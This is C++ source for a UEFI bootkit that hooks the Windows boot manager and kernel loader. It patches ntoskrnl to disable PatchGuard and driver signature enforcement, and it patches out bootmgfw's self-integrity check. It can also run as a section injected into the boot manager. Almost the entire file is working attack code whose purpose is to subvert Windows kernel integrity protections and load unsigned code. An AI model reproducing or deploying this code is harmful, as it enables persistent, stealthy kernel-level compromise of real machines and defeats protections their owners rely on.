#include "Efi.hpp"

static void DisablePatchGuard(void* ImageBase, uint64_t ImageSize)
{
    /*
    nt!KeInitAmd64SpecificState
    INIT:0000000140A4F601 8B C2                  mov     eax, edx
    INIT:0000000140A4F603 99                     cdq
    INIT:0000000140A4F604 41 F7 F8               idiv    r8d
    INIT:0000000140A4F607 89 44 24 30            mov     [rsp+28h+arg_0], eax
    INIT:0000000140A4F60B EB 00                  jmp     short $+2
    */

    auto KeInitAmd64SpecificStateJmp = FIND_PATTERN(ImageBase, ImageSize, "\x8B\xC2\x99\x41\xF7\xF8");

    if (KeInitAmd64SpecificStateJmp != nullptr)
    {
        // Prevent the mov from modifying the return address
        memset(RVA<void*>(KeInitAmd64SpecificStateJmp, 6), 0x90, 4); // nop x4
    }
    else
    {
        Die();
    }

    /*
    nt!KiSwInterrupt
    .text:00000001403FD24E FB                    sti
    .text:00000001403FD24F 48 8D 4D 80           lea     rcx, [rbp+0E8h+var_168]
    .text:00000001403FD253 E8 E8 C2 FD FF        call    KiSwInterruptDispatch
    .text:00000001403FD258 FA                    cli
    */

    auto KiSwInterruptDispatchCall = FIND_PATTERN(ImageBase, ImageSize, "\xFB\x48\x8D\xCC\xCC\xE8\xCC\xCC\xCC\xCC\xFA");

    if (KiSwInterruptDispatchCall != nullptr)
    {
        // Prevent KiSwInterruptDispatch from being executed
        memset(KiSwInterruptDispatchCall, 0x90, 11); // nop x11
    }
    else
    {
        Die();
    }

    // NOTE: EfiGuard has some additional patches, but they do not seem necessary
    // https://github.com/Mattiwatti/EfiGuard/blob/25bb182026d24944713e36f129a93d08397de913/EfiGuardDxe/PatchNtoskrnl.c#L30-L47
}

static void DisableDSE(void* ImageBase, uint64_t ImageSize)
{
    /*
    nt!SepInitializeCodeIntegrity
    PAGE:0000000140799EBB 4C 8D 05 DE 39 48 00   lea     r8, SeCiCallbacks
    PAGE:0000000140799EC2 8B CF                  mov     ecx, edi
    PAGE:0000000140799EC4 48 FF 15 95 71 99 FF   call    cs:__imp_CiInitialize
    */

    auto CiInitializeCall = FIND_PATTERN(ImageBase, ImageSize, "\x4C\x8D\x05\xCC\xCC\xCC\xCC\x8B\xCF");

    if (CiInitializeCall != nullptr)
    {
        // Change CodeIntegrityOptions to zero for CiInitialize call
        *RVA<uint16_t*>(CiInitializeCall, 7) = 0xC931; // xor ecx, ecx
    }
    else
    {
        Die();
    }

    /*
    nt!SeValidateImageData
    PAGE:00000001406EBD15                  loc_1406EBD15:
    PAGE:00000001406EBD15 48 83 C4 48            add     rsp, 48h
    PAGE:00000001406EBD19 C3                     retn
    PAGE:00000001406EBD1A CC                     db 0CCh
    PAGE:00000001406EBD1B                  loc_1406EBD1B:
    PAGE:00000001406EBD1B B8 28 04 00 C0         mov     eax, 0C0000428h
    PAGE:00000001406EBD20 EB F3                  jmp     short loc_1406EBD15
    PAGE:00000001406EBD20                  SeValidateImageData endp
    */

    auto SeValidateImageDataRet = FIND_PATTERN(ImageBase, ImageSize, "\x48\x83\xC4\x48\xC3\xCC\xB8\x28\x04\x00\xC0");

    if (SeValidateImageDataRet != nullptr)
    {
        // Ensure SeValidateImageData returns a success status
        *RVA<uint32_t*>(SeValidateImageDataRet, 7) = 0; // mov eax, 0
    }
    else
    {
        Die();
    }
}

static void HookNtoskrnl(void* ImageBase, uint64_t ImageSize)
{
    DisablePatchGuard(ImageBase, ImageSize);
    DisableDSE(ImageBase, ImageSize);
}

static bool IsNtoskrnl(const wchar_t* ImageName)
{
    static const wchar_t Ntoskrnl[] = L"ntoskrnl.exe";
    static const size_t NtoskrnlLen = ARRAY_SIZE(Ntoskrnl) - 1;

    auto ImageNameLen = wcslen(ImageName);
    if (ImageNameLen < NtoskrnlLen)
    {
        return false;
    }

    return memcmp(&ImageName[ImageNameLen - NtoskrnlLen], Ntoskrnl, NtoskrnlLen * sizeof(wchar_t)) == 0;
}

typedef EFI_STATUS (*BlImgLoadPEImageEx_t)(void*, void*, wchar_t*, void**, uint64_t*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
static BlImgLoadPEImageEx_t BlImgLoadPEImageEx = nullptr;
static uint8_t BlImgLoadPEImageExOriginal[DetourSize];

static EFI_STATUS BlImgLoadPEImageExHook(void* a1, void* a2, wchar_t* LoadFile, void** ImageBase, uint64_t* ImageSize, void* a6, void* a7, void* a8, void* a9, void* a10, void* a11, void* a12, void* a13, void* a14)
{
    // Call original BlImgLoadPEImageEx
    DetourRestore(BlImgLoadPEImageEx, BlImgLoadPEImageExOriginal);

    auto Status =
        BlImgLoadPEImageEx(a1, a2, LoadFile, ImageBase, ImageSize, a6, a7, a8, a9, a10, a11, a12, a13, a14);

    DetourCreate(BlImgLoadPEImageEx, BlImgLoadPEImageExHook, BlImgLoadPEImageExOriginal);

    // Check if loaded file is ntoskrnl and hook it
    if (!EFI_ERROR(Status) && IsNtoskrnl(LoadFile))
    {
        HookNtoskrnl(*ImageBase, *ImageSize);
    }

    return Status;
}

static EFI_OPEN_PROTOCOL OpenProtocol = nullptr;

static EFI_STATUS EFIAPI OpenProtocolHook(EFI_HANDLE Handle, EFI_GUID* Protocol, void** Interface, EFI_HANDLE AgentHandle, EFI_HANDLE ControllerHandle, uint32_t Attributes)
{
    auto Status = OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);

    // Find the calling module's image base
    if (auto ImageBase = FindImageBase((uint64_t)_ReturnAddress()))
    {
        // Find and hook BlImgLoadPEImageEx
        if (auto BlImgLoadPEImageExExport = GetExport(ImageBase, "BlImgLoadPEImageEx", "winload.sys"))
        {
            BlImgLoadPEImageEx = (BlImgLoadPEImageEx_t)BlImgLoadPEImageExExport;

            DetourCreate(BlImgLoadPEImageEx, BlImgLoadPEImageExHook, BlImgLoadPEImageExOriginal);

            // Restore original boot services
            gBS->OpenProtocol = OpenProtocol;
        }
    }

    return Status;
}

static void HookBootServices()
{
    // Hook open protocol (called via BlInitializeLibrary -> ... -> EfiOpenProtocol)
    OpenProtocol = gBS->OpenProtocol;
    gBS->OpenProtocol = OpenProtocolHook;
}

static void HookBootmgfw(void* ImageBase, uint64_t ImageSize)
{
    /*
    bootmgfw!BmFwVerifySelfIntegrity
    .text:000000001002AE5C 89 4C 24 08           mov     [rsp-30h+arg_0], ecx
    .text:000000001002AE60 55                    push    rbp
    .text:000000001002AE61 53                    push    rbx
    .text:000000001002AE62 56                    push    rsi
    .text:000000001002AE63 57                    push    rdi
    .text:000000001002AE64 41 55                 push    r13
    .text:000000001002AE66 41 56                 push    r14
    .text:000000001002AE68 48 8B EC              mov     rbp, rsp
    .text:000000001002AE6B 48 83 EC 68           sub     rsp, 68h
    .text:000000001002AE6F 48 8B 05 FA 71 13 00  mov     rax, cs:BootDevice
    .text:000000001002AE76 33 FF                 xor     edi, edi
    .text:000000001002AE78 48 83 65 C8 00        and     qword ptr [rbp+Device.Type], 0
    .text:000000001002AE7D 48 83 65 48 00        and     [rbp+arg_10], 0
    We try to find this first:
    .text:000000001002AE82 83 4D 38 FF           or      [rbp+arg_0], 0FFFFFFFFh
    .text:000000001002AE86 83 4D 40 FF           or      [rbp+a1], 0FFFFFFFFh
    */
    auto VerifySelfIntegrityMid = FIND_PATTERN(ImageBase, ImageSize, "\x83\x4D\xCC\xFF\x83\x4D\xCC\xFF");
    if (VerifySelfIntegrityMid != nullptr)
    {
        // Find the function start (NOTE: would be cleaner to use the RUNTIME_FUNCTION in the exception directory)
        // mov [rsp+8], ecx
        constexpr auto WalkBack = 0x30;
        auto BmFwVerifySelfIntegrity = FIND_PATTERN(VerifySelfIntegrityMid - WalkBack, WalkBack, "\x89\x4C\x24\x08");
        if (BmFwVerifySelfIntegrity != nullptr)
        {
            // xor eax, eax; ret
            memcpy(BmFwVerifySelfIntegrity, "\x33\xC0\xC3", 3);
        }
        else
        {
            Die();
        }
    }
    else
    {
        Die();
    }
}

static EFI_STATUS LoadBootManager()
{
    // Query bootmgfw from the filesystem
    EFI_DEVICE_PATH* BootmgfwPath = nullptr;
    auto Status = EfiQueryDevicePath(L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi", &BootmgfwPath);

    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Load the boot manager
    EFI_HANDLE BootmgfwHandle = nullptr;
    Status = gBS->LoadImage(TRUE, gImageHandle, BootmgfwPath, nullptr, 0, &BootmgfwHandle);
    gBS->FreePool(BootmgfwPath);

    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Install boot services hook
    HookBootServices();

    // Start the boot manager
    Status = gBS->StartImage(BootmgfwHandle, nullptr, nullptr);

    if (EFI_ERROR(Status))
    {
        gBS->UnloadImage(BootmgfwHandle);
    }

    return Status;
}

EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EfiInitializeGlobals(ImageHandle, SystemTable);

    // Get the EFI image base
    EFI_LOADED_IMAGE* EfiImage = nullptr;
    auto Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&EfiImage);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Set the default error
    Status = EFI_UNSUPPORTED;

    // Check if we are currently running as an injected section
    auto ImageBase = &__ImageBase;
    if (EfiImage->ImageBase != ImageBase)
    {
        // Fix relocations manually
        auto NtHeaders = GetNtHeaders(ImageBase);
        auto NtImageBase = NtHeaders->OptionalHeader.ImageBase;
        auto OriginalImageSize = (uint8_t*)EfiImage->ImageBase - (uint8_t*)ImageBase;

        if (FixRelocations(ImageBase, (uint64_t)ImageBase - (uint64_t)NtImageBase))
        {
            // Install the hooks
            HookBootServices();
            HookBootmgfw(EfiImage->ImageBase, OriginalImageSize);

            // Call the original entry point (embedded in the bootkit PE)
            auto OriginalEntryRva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
            auto OriginalEntry = RVA<decltype(&EfiEntry)>(EfiImage->ImageBase, OriginalEntryRva);

            Status = OriginalEntry(ImageHandle, SystemTable);
        }
    }
    // Relocate the image to a new base
    else if (auto NewImageBase = EfiRelocateImage(ImageBase))
    {
        // Call the relocated LoadBootManager
        auto RelocLoadBootManagerRva = ((uint64_t)&LoadBootManager - (uint64_t)ImageBase);
        auto RelocLoadBootManager = RVA<decltype(&LoadBootManager)>(NewImageBase, RelocLoadBootManagerRva);

        Status = RelocLoadBootManager();
    }

    return Status;
}
